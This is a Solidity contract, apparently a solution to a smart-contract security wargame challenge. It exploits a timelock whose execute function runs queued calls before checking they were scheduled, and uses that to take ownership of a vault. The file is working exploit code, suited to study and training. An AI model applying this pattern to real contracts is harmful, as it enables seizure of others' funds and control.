// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./MiddlemanClimber.sol";
import {ADMIN_ROLE, PROPOSER_ROLE, MAX_TARGETS, MIN_TARGETS, MAX_DELAY} from "../ClimberConstants.sol";

contract HackClimber {

    function becomeOwner(address vault, address vaultTimelock) external {
        // Deploy the external contract that will take care of executing the `schedule` function
        address attacker = msg.sender;
        MiddlemanClimber middleman = new MiddlemanClimber();

        // prepare the operation data composed by 4 different actions
        bytes32 salt = keccak256("attack proposal");
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);

        // set the attacker as the owner of the vault as the first operation
        targets[0] = vault;
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature("transferOwnership(address)", attacker);

        // grant the PROPOSER role to the middle man contract will schedule the operation
        targets[1] = vaultTimelock;
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)",
            PROPOSER_ROLE, address(middleman));

        // set the delay to null
        targets[2] = vaultTimelock;
        values[2] = 0;
        dataElements[2] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        // call the external middleman contract to schedule the operation with the needed data
        targets[3] = address(middleman);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSignature("scheduleOperation(address,address,address,bytes32)",
            attacker, vault, vaultTimelock, salt);

        // anyone can call the `execute` function, there's no auth check over there
        ClimberTimelock(payable(vaultTimelock)).execute(targets, values, dataElements, salt);
    }
}